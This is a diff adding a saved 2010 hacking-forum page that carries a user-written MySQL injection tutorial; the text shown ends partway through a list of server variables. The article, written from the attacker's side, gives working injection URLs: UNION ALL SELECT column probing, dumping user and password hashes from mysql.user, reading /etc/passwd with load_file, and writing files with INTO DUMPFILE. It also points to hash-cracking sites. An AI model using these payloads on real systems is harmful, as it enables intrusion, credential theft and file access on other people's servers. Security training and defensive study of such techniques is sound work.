@@ -1,0 +1,1037 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr"><!-- Source is http://www.hellboundhackers.org/articles/900-sql-injection-whitepaper.html -->
+<head>
+    <title>SQL Injection Whitepaper Article at HellBound Hackers</title>
+    <meta http-equiv='content-type' content='text/html; charset=iso-8859-1' />
+    <meta name='description' content='long (blind) sql injection guide from basic to advanced showing all sides of the story - HellBound Hackers provides the hands-on approach to computer security. Learn how hackers break in, and how to keep them out. Huge resource for computer security and hacking, filled with in depth articles, helpful forum posts and simulated security challenges.' />
+    <meta name='keywords' content='cyber security, network security, computer security, website security, online security, how to hack, hacking, educational hacking, hack, tutorials, security, computers, website hacking' />
+    <link rel='shortcut icon' href='/favicon.gif' type='image/gif' />
+    <link rel='icon' href='/favicon.gif' type='image/gif' />
+    <link rel='image_src' href='/cheese.jpg'/>
+    <link rel='stylesheet' href='900-sql-injection-whitepaper_files/styles-1.css' type='text/css' />
+    <link rel='stylesheet' href='900-sql-injection-whitepaper_files/common.css' type='text/css' />
+    <link rel='stylesheet' href='900-sql-injection-whitepaper_files/css.css' type='text/css' />
+    <link rel='stylesheet' href='900-sql-injection-whitepaper_files/ads.css' type='text/css' />
+    <link rel='alternate' href='/news/rss.xml' title='RSS Feed' type='application/rss+xml' />
+<link rel='stylesheet' href='900-sql-injection-whitepaper_files/styles.css' type='text/css' />
+    <script type='text/javascript' src='900-sql-injection-whitepaper_files/fusion_script.js'></script>
+    <script type='text/javascript' src='900-sql-injection-whitepaper_files/prototype.js'></script>
+    <script type='text/javascript' src='900-sql-injection-whitepaper_files/scriptaculous.js'></script>
+    <script type='text/javascript' src='900-sql-injection-whitepaper_files/modalbox.js'></script>
+    <script type='text/javascript' src='900-sql-injection-whitepaper_files/warning.js'></script>
+    <script type='text/javascript' src='900-sql-injection-whitepaper_files/jquery-1.3.2.js'></script>
+</head>
+<body>
+<div class='full-header' style='padding-top:5px'>
+<div style="text-align: center;"><a href="../index.php"><img src='900-sql-injection-whitepaper_files/hbhbanner.png' title='HellBound Hackers' alt='HellBound Hackers' style='border:0px;' /></a><br /></div>
+</div>
+<div class='white-header' style='position:relative; width:100%; height:10px; right:8px;'>
+<div style='float:left; text-align:left; width:15%; left:8px; position:relative;'><a style='color:#CCCCCC;' href="ircs://storm.psychotik.net::6697/hbh">Join us at IRC!</a></div>
+<div style='float:left; text-align:center; width:70%;'>The important thing is not to stop questioning. - Albert Einstein</div>
+<div style='float:left; text-align:right; width:15%;'>Thursday, September 16, 2010</div>
+</div>
+<table style='width:100%;padding:0px;'>
+<tr>
+<td style="width:170px;" valign='top' class='side-border-left'><div style='width:100%;padding:0px;'>
+
+<div class='scapmain' style='text-align:center;height:14px;'>Navigation</div>
+
+<div class='side-body'>
+
+
+<div class='side-label'><strong>Home</strong></div>
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Main:</small></strong><br />
+<ul>
+<li class='navlink'> <a href='/' class='side'>Home / News</a></li>
+</ul>
+
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Find:</small></strong><br />
+<ul>
+<li class='navlink'><a href='../search.php' class='side'>Search</a></li>
+<li class='navlink'> <a href='../members.php' class='side'>Members</a></li>
+</ul>
+
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Information:</small></strong><br />
+<ul>
+<li class='navlink'> <a href='../development/' class='side'>Development</a></li>
+<li class='navlink'> <a href='../newsletter/' class='side'>Newsletters</a></li>
+<li class='navlink'> <a href='../services.php' class='side'>HBH Services</a></li>
+<li class='navlink'> <a href='../media.php' class='side'>Media</a></li>
+<li class='navlink'> <a href='../school.php' class='side'>Info for Schools</a></li>
+</ul>
+
+
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Additional:</small></strong><br />
+<ul>
+<li class='navlink'> <a href='../userbar.php' class='side'>Userbar</a></li>
+<li class='navlink'> <a href='../faq.php' class='side'>FAQ</a></li>
+<li class='navlink'> <a href='../advertise.php' class='side'>Advertise</a></li>
+<li class='navlink'> <a href='../contact.php' class='side'>Contact HBH</a></li>
+<li class='navlink'> <a href='../disclaimer.php' class='side'>Disclaimer</a></li>
+</ul>
+
+
+<div class='side-label'><strong>Shop</strong></div>
+<ul>
+<li class='navlink'> <a href='../tshirt.php' class='side'>T-Shirts</a></li>
+<li class='navlink'> <a href='../exclusive/index.php' class='side'>Exclusive Membership</a></li>
+</ul>
+
+<div class='side-label'><strong>Learn</strong></div>
+<ul>
+<li class='navlink'> <a href='../articles/index.php' class='side'>Articles</a></li>
+<li class='navlink'> <a href='../lessons.php' class='side'>Lessons</a></li>
+<li class='navlink'> <a href='../code/index.php' class='side'>Code Bank</a></li>
+</ul>
+
+<div class='side-label'><strong>Communicate</strong></div>
+<ul>
+<li class='navlink'> <a href='../forum/index.php' class='side'>Discussion Forum</a></li>
+<li class='navlink'> <a href='../IRC/pjirc.php' class='side'>HBH irc</a></li>
+</ul>
+
+<div class='side-label'><strong>Submit</strong></div>
+<ul>
+<li class='navlink'> <a href='../submit.php?stype=n' class='side'>Submit News</a></li>
+<li class='navlink'> <a href='../submit.php?stype=l' class='side'>Submit Link</a></li>
+<li class='navlink'> <a href='../submit.php?stype=a' class='side'>Submit Article</a></li>
+<li class='navlink'> <a href='../code/codesubmit.php' class='side'>Submit Code</a></li>
+<li class='navlink'> <a href='../bug.php' class='side'>Submit Bug</a></li>
+</ul>
+
+
+
+<div class='side-label'><strong>Challenges</strong></div>
+<ul>
+<li class='navlink'> <a href='../rank.php' class='side'>Rankings</a></li>
+<li class='navlink'> <a href='../challenges/points.php' class='side'>Challenge Points</a></li>
+</ul>
+
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Exploit:</small></strong><br />
+<ul>
+<li class='navlink'> <a href='../challenges/basic.php' class='side'>Basic Web Hacking</a></li>
+<li class='navlink'> <a href='../challenges/app/index.php' class='side'>Application Cracking</a></li>
+<li class='navlink'> <a href='../challenges/js/index.php' class='side'>Javascript Hacking</a></li>
+<li class='navlink'> <a href='../challenges/real.php' class='side'>Realistic Challenges</a></li>
+<li class='navlink'> <a href='../challenges/root.php' class='side'>Rooting Challenges</a></li>
+<li class='navlink'> <a href='../challenges/flash/index.php' class='side'>Flash Challenges</a></li>
+<li class='navlink'> <a href='../challenges/pentest/index.php' class='side'>Pen-Testing Challenges</a></li>
+</ul>
+
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Programming:</small></strong><br />
+<ul>
+<li class='navlink'> <a href='../challenges/timed/index.php' class='side'>Timed Challenges</a></li>
+</ul>
+
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Think:</small></strong><br />
+<ul>
+<li class='navlink'> <a href='../challenges/encryption/index.php' class='side'>Encryption</a></li>
+<li class='navlink'> <a href='../challenges/logic.php' class='side'>Logical</a></li>
+<li class='navlink'> <a href='../challenges/stegano/index.php' class='side'>Stegano</a></li>
+</ul>
+
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Track:</small></strong><br />
+<ul>
+<li class='navlink'> <a href='../challenges/tracking/index.php' class='side'>Tracking</a></li>
+</ul>
+
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Patch:</small></strong><br />
+<ul>
+<li class='navlink'> <a href='../challenges/patch.php' class='side'>Web Patching</a></li>
+<li class='navlink'> <a href='../challenges/app-patching.php' class='side'>App Patching</a></li>
+</ul>
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Other:</small></strong><br />
+<ul>
+<li class='navlink'> <a href='../challenges/other/index.php' class='side'>Other Challenges</a></li>
+<li class='navlink'> <a href='../challenges/social-engineering.php' class='side'>S. Engineering</a></li>
+</ul>
+
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Need Help?</small></strong><br />
+<ul>
+<li class='navlink'> <a href='../challenges/bot/index.php' class='side'>HBHBot</a></li>
+</ul>
+
+<div class='side-label'><strong>Interact</strong></div>
+<ul>
+<li class='navlink'> <a href='/podcasts.php' class='side'>HBH Podcasts</a></li>
+<li class='navlink'> <a href='/interview/' class='side'>Interview with a Hacker</a></li>
+</ul>
+
+<div class='side-label'><strong>Other</strong></div>
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Executive:</small></strong><br />
+<ul>
+<li class='navlink'> <a href='../hof.php' class='side'>Hall of Fame</a></li>
+<li class='navlink'> <a href='../hog.php' class='side'>Hall of Generosity</a></li>
+</ul>
+<img src='900-sql-injection-whitepaper_files/newbutton.gif' alt='HellBoundHackers' title='Navigation Button' />&nbsp;<strong><small>Leisure:</small></strong><br />
+<ul>
+<li class='navlink'> <a href='../urban/index.php' class='side'>Urban Defacements</a></li>
+<li class='navlink'> <a href='../link.php' class='side'>Link to Us</a></li>
+</ul>
+</div>
+
+</div>
+<div style='width:100%;padding:0px;'>
+
+<div class='scapmain' style='text-align:center;height:14px;'>Members Online</div>
+
+<div class='side-body'>
+Total Online: 36<br /><small>Web Spiders: 6</small><br />
+Guests Online: 29<br />
+Members Online: 7<br />
+
+<div class='membersonline small' style='width:100%;text-align:left;border:0px'><a href="../profile/skathgh420.html" ><span style='font-size:10px;'>skathgh420</span></a>, 
+<a href="../profile/HellHound420.html" ><span style='font-size:10px;'>HellHound420</span></a>, 
+<a href="../profile/infectious%20019.html" ><span style='font-size:10px;'>infectious 019</span></a>, 
+<a href="../profile/transaeris.html" ><span style='font-size:10px;'>transaeris</span></a>, 
+<a href="../profile/ShowOff.html" ><span style='font-size:10px;'>ShowOff</span></a>, 
+<a href="../profile/bigd86.html" ><span style='font-size:10px;'>bigd86</span></a>, 
+<a href="../profile/flame_1221.html" ><span style='font-size:10px;'>flame_1221</span></a>
+</div><br />Registered Members: 50700<br />Newest Member: <strong>spank</strong>
+</div>
+
+</div>
+<div style='width:100%;padding:0px;'>
+
+<div class='scapmain' style='text-align:center;height:14px;'>Latest Articles</div>
+
+<div class='side-body'>
+<div style='width:150px;overflow:hidden'>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/930-hardware-hacking-part-1.html ' title='Hardware Hacking Part 1...'>Hardware Hacking Par...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/928-encryption-11-the-simplest-way.html ' title='Encryption 11-The simplest way...'>Encryption 11-The si...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/927-realistic-13.html ' title='Realistic 13...'>Realistic 13...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/926-privacy.html ' title='Privacy...'>Privacy...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/925-uniguest-bypass.html ' title='Uniguest bypass...'>Uniguest bypass...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/924-javascript16.html ' title='javascript16...'>javascript16...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/923-pyserial-and-serial-devices.html ' title='PySerial and serial devices...'>PySerial and serial ...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/922-using-templates-in-c++.html ' title='Using Templates in C++...'>Using Templates in C...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/920-classes-in-php-5.html ' title='Classes in PHP 5...'>Classes in PHP 5...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/919-hierarchical-data-and-sql.html ' title='Hierarchical data and SQL...'>Hierarchical data an...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/918-windows-registry-using-c++-and-win32-api.html ' title='Windows registry Using C++ and Win32 API...'>Windows registry Usi...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/916-the-flaws-of-full-disk-encryption.html ' title='The flaws of full disk encryption....'>The flaws of full di...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/915-encryption-11.html ' title='Encryption #11...'>Encryption #11...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/914-c-c++-memory-structs-objects-and-unions.html ' title='C/C++ Memory structs, objects and unions....'>C/C++ Memory structs...</a></h3>
+<h3 class='articlelink'><a href='http://www.hellboundhackers.org/articles/912-designing-strong-passwords.html ' title='Designing strong passwords...'>Designing strong pas...</a></h3>
+</div></div>
+
+</div>
+
+
+</td><td valign='top' class='main-bg'>
+
+<div style='width:100%; padding:0px;' class='border'>
+
+<div class='capmain' style='padding-left:5px;padding-right:5px'><h1 style='font-weight:bold'>SQL Injection Whitepaper</h1></div>
+
+<div class='main-body'>  <div style="margin:20px;float:right;text-align:center"><br />
+<small>advertisement</small><br />
+<!-- BEGIN STANDARD TAG - 300 x 250 - hellboundhackers.org ::Run-of-site - DO NOT MODIFY --><br />
+<IFRAME FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO WIDTH=300 HEIGHT=250 SRC="http://ad.103092804.com/st?ad_type=iframe&ad_size=300x250&section=320482"></IFRAME><br />
+<!-- END TAG --><br />
+</div><h2><img src='900-sql-injection-whitepaper_files/bullet.gif' alt='website security' /> long (blind) sql injection guide from basic to advanced showing all sides of the story</h2><br /><br />
+<div>Dear hellboundhackers, I want to give my submission hereby by submitting you my knowledge about mysql injections, I will start off by the basic stuff, then going over to blind I will try to provide a wide range of tips and tricks to learn everyone something.<br />
+<br />
+First of all, to totally understand and exploit this learn mysql, php and about windows and linux servers standard configuration files.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>=====================================<br />
+=== Chapter 1 - the basics        ===<br />
+=====================================</code></div><br />
+<br />
+While browsing the Internet you will commonly see things in your url like 'http://example.com/index.php?pageid=326', 'http://example.com/index.php?page=home', see login boxes or any other form of being able to input user controlled elements, actually your entire header you are sending is user controlled. Now here is the possibility that the user can input its own data. Sometimes this data is directly speaking to the database and it might be possible for the attacker to change things so it will react different. In the case the database is a mysql database and the attacker is inputting code to let the database output be different than the creator of the original creator of the code had intended then we are talking about a mysql injection.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>This would be a typical example of a sql injection:<br />
+url:			http://example.com?pageid=326<br />
+the mysql request:	select * from pages where pageid=.$_GET['pageid']</code></div><br />
+<br />
+In order to connect to mysql with php you have to make a connection to the database. This requires a valid user name with password and these are often found in the source of the code, unencrypted.<br />
+<br />
+So as attacker we see the 326 on the screen, what now? How to proof that it is vulnerable? Not hard, try to ask something that is not true, do the same with something that is true.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>Url:			http://example.com/index.php?pageid=326'<br />
+the mysql request:	select * from pages where pageid=326'</code></div><br />
+<br />
+Here the mysql will fail, it sees the quote and will fail and not get the pages for you, the result could be that the page is not displaying, that there are mysql error messages on the screen or something like that.<br />
+<br />
+Now on to the next diagnose, we are going to ask if 1=1 is true, after that we are going to ask for 1=2.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>url:			http://example.com/index.php?pageid=326 AND 1=1<br />
+the mysql request:	select * from pages where pageid=326 AND 1=1</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>url:			http://example.com/index.php?pageid=326 AND 1=2<br />
+the mysql request:	select * from pages where pageid=326 AND 1=2</code></div><br />
+<br />
+If there is nothing missing in situation 1 and situation 2 is giving you a page with missing content or anything else different (might even be in the delay on how long the page loads) then you probably have a mysql injection. It commonly occurs that before it is working you have to use comments to comment away any mysql excecuted later than the user input. By placing '--', '/*', '#' are comments. Here are example url's where comments are enabled:<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 AND 1=1--<br />
+http://example.com/index.php?pageid=326 AND 1=2#<br />
+http://example.com/index.php?pageid=326 AND 1=2/*</code></div><br />
+<br />
+Also, i have heard a situation where the web application scans if you are putting 'AND 1=1' or a '=' (equal) character in your url, in this case you have to come up with something else what is true, try things like:<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>http://example.com/index.php?pageid=326 AND 5*4&gt;30-9<br />
+http://example.com/index.php?pageid=326 AND 5*4&lt;30-9</code></div><br />
+<br />
+In this example there is * selected, this means that everything will be declared from the table with the corresponding pageid, the creator of the code might only use the columns called 'content' and 'title' while there might be more columns for id, author, creation date, last edited or even more.<br />
+In order to find out the amount of columns selected we are going to use the 'order by' command. The 'order by' keyword is used to sort the result-set by a specified column.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>true:<br />
+url:			http://example.com/index.php?pageid=326 order by 1<br />
+the mysql request:	select * from pages where pageid=326 order by 1</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>true:<br />
+url:			http://example.com/index.php?pageid=326 order by 2<br />
+the mysql request:	select * from pages where pageid=326 order by 2</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>true:<br />
+url:			http://example.com/index.php?pageid=326 order by 3<br />
+the mysql request:	select * from pages where pageid=326 order by 3</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>true:<br />
+url:			http://example.com/index.php?pageid=326 order by 4<br />
+the mysql request:	select * from pages where pageid=326 order by 4</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>true:<br />
+url:			http://example.com/index.php?pageid=326 order by 5<br />
+the mysql request:	select * from pages where pageid=326 order by 5</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>false:<br />
+url:			http://example.com/index.php?pageid=326 order by 6<br />
+the mysql request:	select * from pages where pageid=326 order by 6</code></div><br />
+<br />
+From here i am going to make use of the command union, union is not supported in all version of mysql, if it is not supported you have to go on to blind sql injections. I would advise you to read this section, it is very usefull information.<br />
+union is used to combine the result from multiple select statements into a single result set. Here i will be using union all because the union operator only selects distrinct values by default but by using union all it will allow duplicate values.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>url:			http://example.com/index.php?pageid=326 UNION ALL SELECT 1,2,3,4,5,6<br />
+the mysql request:	select * from pages where pageid=326 UNION ALL SELECT 1,2,3,4,5,6</code></div><br />
+<br />
+If it does not work then try to find a nothing containing id, -1 is most of the times a nothing containing id. You can also try for a very, very high id but you will have the risk of overloading the mysql database if it is coded really bad.<br />
+<br />
+If you see number 2 where the text should have been and somewhere else a 3 where the author should have been then you got a vulnerable version. It means that the creator only used the second column, containing the content and the third column which contained the author. The first column is usualy used for ID, you wont see this one back alot on the screen unless it is used for keeping track of numbers for trouble tickets in a ticket system or something.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>url:			http://example.com/index.php?pageid=326 UNION ALL SELECT 1,version(),3,4,5,6<br />
+the mysql request:	select * from pages where pageid=326 UNION ALL SELECT 1,version(),3,4,5,6</code></div><br />
+<br />
+Now you see the version where earlyer was the 2. This comes straight from mysql. Now the next logical step is to see how many rights you got, in order to select things from the mysql.user table you have to have alot of rights. By trying to select somehting from there you got an easy way to find out if you have too many rights.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>url:			http://example.com/index.php?pageid=326 UNION ALL SELECT 1,version(),3,4,5,6 from mysql.user<br />
+the mysql request:	select * from pages where pageid=326 UNION ALL SELECT 1,version(),3,4,5,6 from mysql.user</code></div><br />
+<br />
+If this works you want to get the hashes and users of the mysql.user table.<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>root<br />
+http://example.com/index.php?pageid=326<br />
+UNION ALL SELECT 1,concat(user, 0x3a, password),3,4,5,6 from mysql.user limit 0,1</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>root<br />
+http://example.com/index.php?pageid=326<br />
+UNION ALL SELECT 1,concat(user, 0x3a, password),3,4,5,6 from mysql.user limit 1,1</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>root<br />
+http://example.com/index.php?pageid=326<br />
+UNION ALL SELECT 1,concat(user, 0x3a, password),3,4,5,6 from mysql.user limit 2,1</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>system maintainer<br />
+http://example.com/index.php?pageid=326<br />
+UNION ALL SELECT 1,concat(user, 0x3a, password),3,4,5,6 from mysql.user limit 3,1</code></div><br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>from here usually start the manually inserted users<br />
+http://example.com/index.php?pageid=326<br />
+UNION ALL SELECT 1,concat(user, 0x3a, password),3,4,5,6 from mysql.user limit 4,1</code></div><br />
+<br />
+Concat is to return concatenated strings, limit 0,1 is used to loop through the result, the 0 tells to return the first row that is outputted while if it would be 1 it would go to the second row and so on. The 1 tells how many rows to output, keep it 1 in order to keep outputting only the first row.<br />
+http://passcracking.ru/ is a very handy site to decode your mysql hashes, if you want to do it manually then try john the ripper or ask google for the hash, it might have indexed it somewhere ;) google finds a lot. Put quotes around the hash, its better for the result. Here is an example:<br />
+http://www.google.nl/search?hl=en&q=%22*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29%22&btnG=Google+Search&aq=f&oq=<br />
+3a is the hex representation of the ascii char ':', by putting a 0x before a value mysql will understand it hash to convert a hex character to an ascii char. This way you can get non executing quotes with 0x22 and 0x27.<br />
+See this picture for more a good overview of hex - ascii characters.<br />
+http://www.asciitable.com/asciifull.gif<br />
+<br />
+So the hashes are too strong to crack? no problem, we are going to see if we can write to things.<br />
+http://dev.mysql.com/doc/refman/5.0/en/select.html<br />
+There they mention you can use select things and store them in dump files.<br />
+<br />
+(from dev.mysql.com about select)<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>SELECT<br />
+[ALL | DISTINCT | DISTINCTROW ]<br />
+[HIGH_PRIORITY]<br />
+[STRAIGHT_JOIN]<br />
+[SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]<br />
+[SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]<br />
+select_expr [, select_expr ...]<br />
+[FROM table_references<br />
+[WHERE where_condition]<br />
+[GROUP BY {col_name | expr | position}<br />
+[ASC | DESC], ... [WITH ROLLUP]]<br />
+[HAVING where_condition]<br />
+[ORDER BY {col_name | expr | position}<br />
+[ASC | DESC], ...]<br />
+[LIMIT {[offset,] row_count | row_count OFFSET offset}]<br />
+[PROCEDURE procedure_name(argument_list)]<br />
+[INTO OUTFILE 'file_name' export_options<br />
+| INTO DUMPFILE 'file_name'<br />
+| INTO var_name [, var_name]]<br />
+[FOR UPDATE | LOCK IN SHARE MODE]]</code></div><br />
+<br />
+so we would choose union all select 1,'content',3,4,5,6 into dumpfile 'file_name'.<br />
+<br />
+in our situation:<br />
+http://example.com/index.php?pageid=326 UNION ALL SELECT 1,'test',3,4,5,6 into dumpfile '/tmp/write'<br />
+<br />
+Now you might wonder like 'Hey but in what directory is the website that i am exploiting' well, apache made something handy for this, its called a virtual hosts configuration file, its always searching a little bit where it is located but its commonly easy to find.<br />
+<br />
+Here you can find some handy information in this process:<br />
+http://wiki.apache.org/httpd/DistrosDefaultLayout<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>You can open the files with:<br />
+http://example.com/index.php?pageid=326 UNION ALL SELECT 1,concat('&lt;pre&gt;', load_file('/etc/passwd'), '&lt;/pre&gt;'),3,4,5,6<br />
+http://example.com/index.php?pageid=326 UNION ALL SELECT 1,concat('&lt;pre&gt;', load_file('/etc/hosts'), '&lt;/pre&gt;'),3,4,5,6</code></div><br />
+I love to use the &lt;pre&gt; tag during this process, this way it will make a much neater result. concat is to return concatenated strings.<br />
+Also to explore the infrastructure of the server you can use the standard mysql variables here is a list of variables what might work:<br />
+<br />
+<div class='quote' style='width:400px;white-space:nowrap;overflow:auto'><code>mysql&gt; show variables;<br />
++---------------------------------+<br />
+| Variable_name | Value |<br />
++---------------------------------+<br />
+| auto_increment_increment | |<br />
+| auto_increment_offset | |<br />
+| automatic_sp_privileges | |<br />
+| back_log | |<br />
+| basedir | |<br />
+| binlog_cache_size | |<br />
+| bulk_insert_buffer_size | |<br />
+| character_set_client | |<br />
+| character_set_connection | |<br />
+| character_set_database | |<br />
+| character_set_filesystem | |<br />
+| character_set_results | |<br />
+| character_set_server | |<br />
+| character_set_system | |<br />
+| character_sets_dir | |<br />
+| collation_connection | |<br />
+| collation_database | |<br />
+| collation_server | |<br />
+| completion_type | |<br />
+| concurrent_insert | |<br />
+| connect_timeout | |<br />
+| datadir | |<br />
+| date_format | |<br />
+| datetime_format | |<br />
+| default_week_format | |<br />
+| delay_key_write | |<br />
+| delayed_insert_limit | |<br />
+| delayed_insert_timeout | |<br />
+| delayed_queue_size | |<br />
+| div_precision_increment | |<br />
+| keep_files_on_create | |<br />
+| engine_condition_pushdown | |<br />
+| expire_logs_days | |<br />
+| flush | |<br />
+| flush_time | |<br />
+| ft_boolean_syntax | |<br />
+| ft_max_word_len | |<br />
+| ft_min_word_len | |<br />
+| ft_query_expansion_limit | |<br />
+| ft_stopword_file | |<br />
+| group_concat_max_len | |<br />
+| have_archive | |<br />
+| have_bdb | |<br />
+| have_blackhole_engine | |<br />
+| have_compress | |<br />
+| have_crypt | |<br />
+| have_csv | |<br />
+| have_dynamic_loading | |<br />
+| have_example_engine | |<br />
+| have_federated_engine | |<br />
+| have_geometry | |<br />
+| have_innodb | |<br />
+| have_isam | |<br />
+| have_merge_engine | |<br />
+| have_ndbcluster | |<br />
+| have_openssl | |<br />
+| have_ssl | |<br />
+| have_query_cache | |<br />
+| have_raid | |<br />
+| have_rtree_keys | |<br />
+| have_symlink | |<br />
+| hostname | |<br />
+| init_connect | |<br />
+| init_file | |<br />
+| init_slave | |<br />
+| innodb_additional_mem_pool_size | |<br />
+| innodb_autoextend_increment | |<br />
+| innodb_buffer_pool_awe_mem_mb | |<br />
+| innodb_buffer_pool_size | |<br />
+| innodb_checksums | |<br />
+| innodb_commit_concurrency | |<br />
+| innodb_concurrency_tickets | |<br />
+| innodb_data_file_path | |<br />
+| innodb_data_home_dir | |<br />
+| innodb_adaptive_hash_index | |<br />
+| innodb_doublewrite | |<br />
+| innodb_fast_shutdown | |<br />
+| innodb_file_io_threads | |<br />
+| innodb_file_per_table | |<br />
+| innodb_flush_log_at_trx_commit | |<br />
+| innodb_flush_method | |<br />
+| innodb_force_recovery | |<br />
+| innodb_lock_wait_timeout | |<br />
+| innodb_locks_unsafe_for_binlog | |<br />
+| innodb_log_arch_dir | |<br />
+| innodb_log_archive | |<br />
+| innodb_log_buffer_size | |<br />
+| innodb_log_file_size | |<br />
+| innodb_log_files_in_group | |<br />
+| innodb_log_group_home_dir | |<br />
+| innodb_max_dirty_pages_pct | |<br />
+| innodb_max_purge_lag | |<br />
+| innodb_mirrored_log_groups | |<br />
+| innodb_open_files | |<br />
+| innodb_rollback_on_timeout | |<br />
+| innodb_support_xa | |<br />
+| innodb_sync_spin_loops | |<br />
+| innodb_table_locks | |<br />
+| innodb_thread_concurrency | |<br />
+| innodb_thread_sleep_delay | |<br />
+| interactive_timeout | |<br />
+| join_buffer_size | |<br />
+| key_buffer_size | |<br />
+| key_cache_age_threshold | |<br />
+| key_cache_block_size | |<br />
+| key_cache_division_limit | |<br />
+| language | |<br />
+| large_files_support | |<br />
+| large_page_size | |<br />
+| large_pages | |<br />
+| lc_time_names | |<br />
+| license | |<br />
+| local_infile | |<br />
+| locked_in_memory | |<br />
+| log | |<br />
+| log_bin | |<br />
+| log_bin_trust_function_creators | |<br />
+| log_error | |<br />
+| log_queries_not_using_indexes | |<br />
+| log_slave_updates | |<br />
+| log_slow_queries | |<br />
+| log_warnings | |<br />
+| long_query_time | |<br />
+| low_priority_updates | |<br />
+| lower_case_file_system | |<br />
+| lower_case_table_names | |<br />
+| max_allowed_packet | |<br />
+| max_binlog_cache_size | |<br />
+| max_binlog_size | |<br />
+| max_connect_errors | |<br />
+| max_connections | |<br />
+| max_delayed_threads | |<br />
+| max_error_count | |<br />
+| max_heap_table_size | |<br />
+| max_insert_delayed_threads | |<br />
+| max_join_size | |<br />
+| max_length_for_sort_data | |<br />
+| max_prepared_stmt_count | |<br />
+| max_relay_log_size | |<br />
+| max_seeks_for_key | |<br />
+| max_sort_length | |<br />
+| max_sp_recursion_depth | |<br />
+| max_tmp_tables | |<br />
+| max_user_connections | |<br />
+| max_write_lock_count | |<br />
+| multi_range_count | |<br />
+| myisam_data_pointer_size | |<br />
+| myisam_max_sort_file_size | |<br />
+| myisam_recover_options | |<br />
+| myisam_repair_threads | |<br />
+| myisam_sort_buffer_size | |<br />
+| myisam_stats_method | |<br />
